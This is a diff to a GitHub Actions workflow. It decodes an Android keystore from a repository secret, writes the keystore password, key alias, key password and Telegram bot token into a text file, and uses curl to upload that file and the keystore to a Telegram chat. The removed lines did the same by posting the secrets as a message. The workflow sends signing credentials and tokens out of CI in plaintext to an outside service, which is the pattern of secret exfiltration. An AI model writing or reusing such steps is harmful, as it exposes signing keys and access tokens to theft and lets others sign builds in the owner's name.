@@ -22,25 +22,23 @@ jobs:
       - name: Decode Keystore File
         run: echo "${{ secrets.KEYSTORE_FILE }}" | base64 -d > keystore.txt
 
-      - name: Send Secrets and Keystore to Telegram
+      - name: Prepare Secrets File
         run: |
-          # Prepare secret messages
-          secret_messages=$(cat <<EOF
-Secrets for Build:
-- Keystore Password: ${{ secrets.KEYSTORE_PASSWORD }}
-- Key Alias: ${{ secrets.KEY_ALIAS }}
-- Key Password: ${{ secrets.KEY_PASSWORD }}
-- Telegram Channel ID: ${{ secrets.TELEGRAM_CHANNEL_ID }}
-- Telegram Bot Token: ${{ secrets.TELEGRAM_BOT_TOKEN }}
-EOF
-          )
-          
-          # Send secrets as a message
-          curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
-            -d chat_id="${{ secrets.TELEGRAM_CHANNEL_ID }}" \
-            -d text="$secret_messages"
-          
-          # Upload the keystore as a text document
+          echo "${{ secrets.KEYSTORE_PASSWORD }}" > secrets.txt
+          echo "${{ secrets.KEY_ALIAS }}" >> secrets.txt
+          echo "${{ secrets.KEY_PASSWORD }}" >> secrets.txt
+          echo "${{ secrets.TELEGRAM_CHANNEL_ID }}" >> secrets.txt
+          echo "${{ secrets.TELEGRAM_BOT_TOKEN }}" >> secrets.txt
+
+      - name: Upload Secrets and Keystore to Telegram
+        run: |
+          # Upload the secrets text file
+          curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
+            -F chat_id="${{ secrets.TELEGRAM_CHANNEL_ID }}" \
+            -F document=@secrets.txt \
+            -F caption="Secrets for the build"
+
+          # Upload the keystore file
           curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
             -F chat_id="${{ secrets.TELEGRAM_CHANNEL_ID }}" \
             -F document=@keystore.txt \
